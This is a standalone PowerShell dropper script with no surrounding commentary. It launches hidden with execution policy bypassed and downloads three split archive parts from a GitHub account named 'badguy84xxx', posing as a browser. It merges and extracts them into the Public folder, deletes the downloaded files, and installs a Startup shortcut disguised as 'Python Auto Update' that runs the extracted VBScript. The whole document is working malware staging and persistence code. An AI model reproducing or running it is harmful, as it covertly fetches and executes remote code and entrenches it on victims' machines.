cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
# Define URLs and download paths
$urls = @(
    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.001",
    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.002",
    "https://github.com/badguy84xxx/back/raw/refs/heads/main/Backup.zip.003"
)
$publicDir = "$env:Public"
$outputDir = Join-Path -Path $publicDir -ChildPath "Python"
$downloadedFiles = @()
$outputFile = Join-Path -Path $publicDir -ChildPath "Backup.zip"

# Create destination directory if it doesn't exist
if (!(Test-Path -Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
}

# Download all files
foreach ($url in $urls) {
    # Extract file name from URL
    $fileName = [System.IO.Path]::GetFileName($url)
    $filePath = Join-Path -Path $publicDir -ChildPath $fileName

    # Download file
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    try {
        $webClient.DownloadFile($url, $filePath)
        Write-Output "Downloaded successfully: $filePath"
        $downloadedFiles += $filePath # Record downloaded file
    } catch {
        Write-Output "Error downloading: $url"
        Write-Output "Error details: $_"
        continue
    }
}

# Merge .001, .002, .003 files into Backup.zip
try {
    Get-Content -Path ($downloadedFiles | Sort-Object) -Encoding Byte -ReadCount 0 |
        Set-Content -Path $outputFile -Encoding Byte
    Write-Output "Files merged successfully: $outputFile"
} catch {
    Write-Output "Error during file merge: $_"
    exit
}

# Extract ZIP file
if (Test-Path -Path $outputFile) {
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($outputFile, $outputDir)
        Write-Output "Extraction completed: $outputFile to $outputDir"

        # Delete ZIP file and downloaded parts
        Remove-Item -Path $outputFile -Force
        Write-Output "Deleted ZIP file: $outputFile"

        foreach ($file in $downloadedFiles) {
            Remove-Item -Path $file -Force
            Write-Output "Deleted part file: $file"
        }
    } catch {
        Write-Output "Error during extraction: $_"
    }
} else {
    Write-Output "ZIP file not found or merge failed: $outputFile"
}

# Create Shortcut for Python.vbs in Startup folder
$TargetFile = "C:\Users\Public\Python\Python.vbs"
$ShortcutName = "Python Auto Update.lnk"
$StartupFolder = "$([Environment]::GetFolderPath('Startup'))"
$ShortcutPath = Join-Path -Path $StartupFolder -ChildPath $ShortcutName

try {
    # Create WScript.Shell object
    $Shell = New-Object -ComObject WScript.Shell

    # Create Shortcut
    $Shortcut = $Shell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = $TargetFile
    $Shortcut.WorkingDirectory = (Split-Path -Path $TargetFile)
    $Shortcut.Save()

    Write-Host "Shortcut created at $ShortcutPath"

    # Execute Shortcut
    Start-Process -FilePath $ShortcutPath
    Write-Output "Shortcut executed: $ShortcutPath"
} catch {
    Write-Output "Error creating or executing Shortcut: $_"
}
